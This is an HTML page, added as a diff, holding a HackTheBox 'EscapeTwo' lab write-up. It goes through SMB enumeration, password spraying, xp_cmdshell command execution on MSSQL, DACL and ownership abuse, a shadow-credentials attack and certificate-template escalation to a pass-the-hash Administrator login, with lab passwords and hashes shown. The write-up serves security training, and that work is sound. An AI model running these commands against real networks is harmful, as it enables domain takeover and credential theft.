@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Writeup - Machine Name</title>
+    <style>
+        body {
+           
+           background-image: url(./capturashack/maths.jpg);
+           background-repeat: no-repeat;
+  background-size: cover;
+  background-position: center;
+  background-attachment: fixed;
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            padding: 20px;
+            max-width: 900px;
+            margin: auto;
+            height: 100vh;
+        }
+        a {
+            color: #4ea5ff;
+        }
+        h1, h2 {
+            color: #ece6e6cb;
+        }
+        .code-block {
+            background-color: #1e1e1e;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            position: relative;
+        }
+        .code-block code {
+            white-space: pre-wrap;
+            display: block;
+            padding: 5px;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #444;
+            color: #fff;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+            border-radius: 3px;
+        }
+        .img-container img {
+            max-width: 100%;
+            border: 1px solid #333;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>HTB - EscapeTwo Writeup</h1>
+    <p><a href="#">Link to room on HackTheBox</a></p>
+
+    <h3>Edit /etc/hosts</h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 10.10.11.51 -oG allports</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/1.png" alt="nmap output">
+    </div>
+
+
+    <h3>Scan with Nmap</h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>nmap -sCV -p53,88,135,139,389,445,464,593,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49689,49690,49704,49722,49822 10.10.11.51 -oN targeted</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/nmap.png" alt="nmap output">
+    </div>
+
+    <h3>Try list resources smb with smbmap. Credentials HTB: user: rose password: KxEPkKe6R8su</h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>smbmap -H 10.10.11.51 -u rose -p 'KxEPkKe6R8su'</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/3.png" alt="nmap output">
+    </div>
+
+    <h3>We are in the right place. There are 2 unique shares, Users and Accounting Department. We have read access to them so we can see what is in them. We can use smbclient to connect to the shares.</h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>smbclient //10.10.11.51/'Accounting Department' -U rose</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/4.png" alt="nmap output">
+    </div>
+
+
+    
+    <h3>Use strings to show strings in to xlsx,next get files, rename xlsx to zip and unzip </h3>
+    
+    <div class="img-container">
+        <img src="capturashack/5.png" alt="nmap output">
+    </div>
+
+
+    
+    <h3>Navigate to xl folders and we found 4 users and passwords</h3>
+    
+    <div class="img-container">
+        <img src="capturashack/6.png" alt="nmap output">
+    </div>
+
+    <h3>saving users in files</h3>
+    <div class="img-container">
+        <img src="capturashack/8.png" alt="nmap output">
+    </div>
+
+
+
+    <h3>Use Kerbrute to validate which users are actually on the domain.</h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>kerbrute userenum --dc 10.10.11.51 -d sequel.htb users.txt</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/9.png" alt="nmap output">
+    </div>
+
+
+    <h1>Password Spraying</h1>
+    <h3>We use NetExec for password spray.
+        💡 Sometimes it's necessary to use the --local-auth flag to force local authentication (SQL login) instead of Windows Integrated Authentication, especially when targeting accounts like sa, we can use --continue-on-success
+for not stop spraying password.    </h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>nxc smb sequel.htb -u users.txt -p pass.txt</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/10.png" alt="nmap output">
+    </div>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>nxc mssql sequel.htb -u users.txt -p pass.txt --local-auth</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/11.png" alt="nmap output">
+    </div>
+
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>nxc smb sequel.htb -u users.txt -p pass.txt --continue-on-success</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/12.png" alt="nmap output">
+    </div>
+
+    <h3>We can use impacket-mssqlclient to connect in mssql </h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>impacket-mssqlclient sequel.htb/'sa:MSSQLP@ssw0rd!'@10.10.11.51</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/13.png" alt="nmap output">
+    </div>
+
+    <h3>We can try execute a cmd command</h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>EXEC xp_cmdshell whoami</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/14.png" alt="nmap output">
+    </div>
+
+
+    
+    <h3>It seems it is blocked. We need to enable it.</h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>EXECUTE sp_configure 'xp_cmdshell',1</code>
+        <code>RECONFIGURE</code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/15.png" alt="nmap output">
+    </div>
+
+    <div class="img-container">
+        <img src="capturashack/16.png" alt="nmap output">
+    </div>
+
+    <h3>We can execute commands now. Let's try running a dir on the Users folder to list its contents, and then we can try viewing the configuration.ini file from MSSQL 2019 to check if there are any plaintext passwords inside.
+    We found other user , we add to users.txt
+    </h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>EXEC xp_cmdshell "dir C:\Users\"</code>
+       
+    </div>
+    <div class="img-container">
+        <img src="capturashack/17.png" alt="nmap output">
+    </div>
+
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>EXEC xp_cmdshell "type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"</code>
+       
+    </div>
+    <div class="img-container">
+        <img src="capturashack/18.png" alt="exec output">
+    </div>
+
+
+    <h3>We use NetExec for password spraying
+        </h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+            <code>netexec smb sequel.htb -u users.txt -p pass.txt --continue-on-success</code>
+           
+        </div>
+        <div class="img-container">
+            <img src="capturashack/19.png" alt="nmap output">
+        </div>
+
+
+
+        
+    <h3>We use Evil-Winrm with the new credentials , and we found the user flag in the desktop. 
+    </h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3</code>
+       
+    </div>
+    <div class="img-container">
+        <img src="capturashack/20.png" alt="nmap output">
+    </div>
+
+<h1>Admin Flag </h1>
+
+<h3>We use Bloodhound python for generate a zip with all data from AD and ingest with BloodHound GUI 
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>python3 bloodhound.py -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.10.11.51 -c All --zip</code>
+</div>
+
+<h3>After upload AD zip, use query for kerberoastable users in Explorer > Cypher section   
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>MATCH (u:User {hasspn:true}) RETURN u</code>
+</div>
+<div class="img-container">
+    <img src="capturashack/bloodhound.png" alt="bloodhound output">
+</div>
+
+<h3>Next we can change owner for ca_svc , the owner now is ryan. 
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC ryan</code>
+</div>
+<div class="img-container">
+    <img src="capturashack/bloodyAD.png" alt="bloodhound output">
+</div>
+
+
+<h3>Next we can change owner for ca_svc , the owner now is ryan. with impacket 0_12 , 0_13 version dont working for this 
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"</code>
+</div>
+<div class="img-container">
+    <img src="capturashack/bloodyAD.png" alt="bloodhound output">
+</div>
+
+
+<h3>After giving full control to get hash of user ca_svc we need to make shadow credendentials attack. This attack adds key of user ryan to msDS-KeyCredentialLink of user ca_svc . After that user ryan becomes a copy account of user ca_svc. For to do this we can use certipy tool like this 
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'</code>
+</div>
+<div class="img-container">
+    <img src="capturashack/cert.png" alt="bloodhound output">
+</div>
+
+
+
+<h3>Now we have ntlm hash of user ca_svc. With this user we can control certificates that determine user authorizations. We can change templates to escalate our privileges. But first we need to learn template name with this command
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>certipy find -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51</code>
+</div>
+<div class="img-container">
+    <img src="capturashack/certificatetxt.png" alt="bloodhound output">
+</div>
+
+
+<h3>From this output we learn that template name is DunderMifflinAuthentication . We can change template to escalate our privileges with this command
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>KRB5CCNAME=$PWD/ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb</code>
+</div>
+<div class="img-container">
+    <img src="capturashack/certificatetxt.png" alt="bloodhound output">
+</div>
+<div class="img-container">
+    <img src="capturashack/templatecert.png" alt="bloodhound output">
+</div>
+
+
+<h3>From this output we learn that template name is DunderMifflinAuthentication . We can change template to escalate our privileges with this command
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>KRB5CCNAME=$PWD/ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb</code>
+</div>
+
+<h3>After updating template we can get certificate of administrator with this commands
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>echo "10.10.11.51 dc01.sequel.htb" >> /etc/hosts</code>
+</div>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>certipy req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51</code>
+</div>
+
+
+<h3>After this we have Administrator's certificate . We can get hash of Administrator with this command
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>certipy auth -pfx administrator_10.pfx -domain sequel.htb</code>
+</div>
+
+
+<h3>and finally we can login with evil-winrm with this command, and found the flag in Desktop. 
+
+</h3>
+<div class="code-block">
+    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+    <code>evil-winrm -i 10.10.11.51 -u Administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'</code>
+</div>
+<div class="img-container">
+    <img src="capturashack/adminflag.png" alt="bloodhound output">
+</div>
+
+
+
+    <script>
+        function copyToClipboard(btn) {
+            const code = btn.nextElementSibling.innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.innerText = "Copied!";
+                setTimeout(() => { btn.innerText = "Copy"; }, 1500);
+            });
+        }
+    </script>
+</body>
+</html>
